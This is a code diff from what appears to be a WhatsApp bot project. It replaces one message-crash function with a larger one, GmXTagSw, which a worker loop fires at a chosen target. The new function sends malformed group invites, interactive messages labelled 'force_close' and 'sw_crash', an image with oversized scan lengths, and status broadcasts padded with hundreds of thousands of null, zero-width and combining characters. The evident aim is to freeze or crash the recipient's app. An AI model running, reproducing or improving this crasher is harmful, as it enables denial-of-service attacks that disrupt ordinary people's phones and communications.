@@ -3399,7 +3399,7 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await KiranaFreze(sock, target);
+                    await GmXTagSw(sock, target);
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4524,26 +4524,111 @@ async function VogueDelay(sock, target) {
   }
 }
 
-asnyc function KiranaFreze(sock, target) {
-  const msg = generateWaMessageFromContent(target, {
-    interactiveResponseMessage: {
-      header: {
-        tittle: "\0".repeat(99999),
-        hasMediaAttachment: false 
-      },
-      nativeFlowResponseMessage: {
-        buttons:[{
-         name: "inapp_signup"
-             : "{}"
-        }]
-      },
-      body: {
-        text: "",
-      }
+async function GmXTagSw(sock, target) {
+    const delay = ms => new Promise(r => setTimeout(r, ms))
+    const nullChar = "\u0000".repeat(150000)
+    const zeroWidth = "‍".repeat(120000)
+    const crashChar = "𑇂".repeat(150000)
+    const space = " ".repeat(80000)
+    const blankChar = "\u200B".repeat(100000)
+    const clickPayload = "ꦽ".repeat(5000) + "ꦾ".repeat(25000) + "ោ៝".repeat(25000)
+    
+    for (let i = 0; i < 3; i++) {
+        try {
+            await sock.relayMessage(target, {
+                groupInviteMessage: {
+                    groupJid: "1@g.us",
+                    inviteCode: "ꦽ".repeat(5000),
+                    inviteExpiration: "99999999999",
+                    groupName: "Garam madu" + "ꦾ".repeat(25000),
+                    caption: " x " + "ꦾ".repeat(5000),
+                    body: { text: "\n" + "ោ៝".repeat(25000) },
+                    contextInfo: {
+                        quotedMessage: {
+                            paymentInviteMessage: {
+                                serviceType: 1,
+                                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
+                            }
+                        }
+                    }
+                }
+            }, { participant: { jid: target } })
+            await delay(120)
+            
+            await sock.relayMessage(target, {
+                interactiveResponseMessage: {
+                    body: { text: nullChar + zeroWidth, format: 1 },
+                    footer: { text: crashChar, format: 0 },
+                    nativeFlowResponseMessage: {
+                        name: "force_close",
+                        paramsJson: `{\"payload\":\"${nullChar}\",\"data\":\"${zeroWidth}\"}`,
+                        version: 3
+                    }
+                }
+            }, { participant: { jid: target } })
+            await delay(120)
+            
+            await sock.relayMessage('status@broadcast', {
+                interactiveResponseMessage: {
+                    body: { text: crashChar + blankChar, format: 0 },
+                    nativeFlowResponseMessage: {
+                        name: "sw_crash",
+                        paramsJson: `{\"trigger\":\"click\",\"data\":\"${crashChar}\"}`,
+                        version: 3
+                    }
+                }
+            }, { statusJidList: [target] })
+            await delay(120)
+            
+            await sock.relayMessage(target, {
+                imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
+                    fileLength: "93217",
+                    caption: clickPayload.substring(0, 5000),
+                    height: 1080,
+                    width: 1080,
+                    mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
+                    fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
+                    directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1778142659",
+                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
+                    contextInfo: {
+                        pairedMediaType: "NOT_PAIRED_MEDIA",
+                        isQuestion: true,
+                        isGroupStatus: true
+                    },
+                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
+                    scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
+                    midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
+                }
+            }, {})
+            await delay(150)
+            
+            await sock.relayMessage(target, {
+                extendedTextMessage: {
+                    text: nullChar + blankChar,
+                    matchedText: " ",
+                    description: zeroWidth,
+                    title: crashChar,
+                    previewType: "NONE",
+                    contextInfo: {
+                        mentionedJid: [target],
+                        stanzaId: "FC_" + Date.now() + "_" + i
+                    }
+                }
+            }, { participant: { jid: target } })
+            await delay(150)
+        } catch(e) {}
     }
-  }, {quoted: null})
-  await sock.relayMessage(target, msg.message, {
-  })
+    
+    for (let z = 0; z < 2; z++) {
+        await sock.relayMessage('status@broadcast', {
+            conversation: "\u0000".repeat(150000) + "‍".repeat(150000)
+        }, { statusJidList: [target] })
+        await delay(100)
+    }
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
